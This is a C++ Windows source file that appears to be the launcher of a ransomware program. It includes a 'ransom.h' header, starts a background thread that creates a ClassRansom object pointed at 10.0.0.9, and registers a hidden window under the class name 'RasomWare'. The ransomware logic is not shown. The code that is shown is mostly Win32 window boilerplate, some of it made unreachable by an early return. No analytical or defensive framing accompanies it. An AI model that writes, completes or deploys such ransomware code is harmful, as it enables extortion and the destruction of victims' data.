#include <windows.h>
#include <string>
#include <process.h>
#include "ransom.h"
using namespace nsRasonV1;
using std::string;	


unsigned __stdcall ThreadFunction01(void* pArguments)
{
	ClassRansom cr("10.0.0.9");
	_endthreadex(0);
	return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{
	const wchar_t CLASS_NAME[] = L"RasomWare";

	HANDLE hThread;
	unsigned threadID;
	hThread = (HANDLE)_beginthreadex(NULL, 0, &ThreadFunction01, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
	return 0;

	WNDCLASS wc = {};

	wc.lpfnWndProc = WindowProc;
	wc.hInstance = hInstance;
	wc.lpszClassName = CLASS_NAME;

	RegisterClass(&wc);

	// Create the window.

	HWND hwnd = CreateWindowEx(
		0,                              // Optional window styles.
		CLASS_NAME,                     // Window class
		L"Briana",    // Window text
		WS_OVERLAPPEDWINDOW,            // Window style

										// Size and position
		CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,

		NULL,       // Parent window    
		NULL,       // Menu
		hInstance,  // Instance handle
		NULL        // Additional application data
	);

	if (hwnd == NULL)
	{
		return 0;
	}
	ShowWindow(hwnd, SW_HIDE);
	//ShowWindow(hwnd, SW_HIDE);
	    /*SW_HIDE = 0
		Hide the window.
		SW_MAXIMIZE = 3
		Maximize the window.
		SW_MINIMIZE = 6
		Minimize the window.
		SW_RESTORE = 9
		Restore the window(not maximized nor minimized).
		SW_SHOW = 5
		Show the window.
		SW_SHOWMAXIMIZED = 3
		Show the window maximized.
		SW_SHOWMINIMIZED = 2
		Show the window minimized.
		SW_SHOWMINNOACTIVE = 7
		Show the window minimized but do not activate it.
		SW_SHOWNA = 8
		Show the window in its current state but do not activate it.
		SW_SHOWNOACTIVATE = 4
		Show the window in its most recent size and position but do not activate it.
		SW_SHOWNORMAL = 1*/
	// Run the message loop.
	
	MSG msg = {};
	while (GetMessage(&msg, NULL, 0, 0))
	{		
		
		TranslateMessage(&msg);
		DispatchMessage(&msg);	
	}
	CloseHandle(hThread);
	return 0;
}
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;

	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hwnd, &ps);
		FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));

		EndPaint(hwnd, &ps);		
	}	
	return 0;

	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
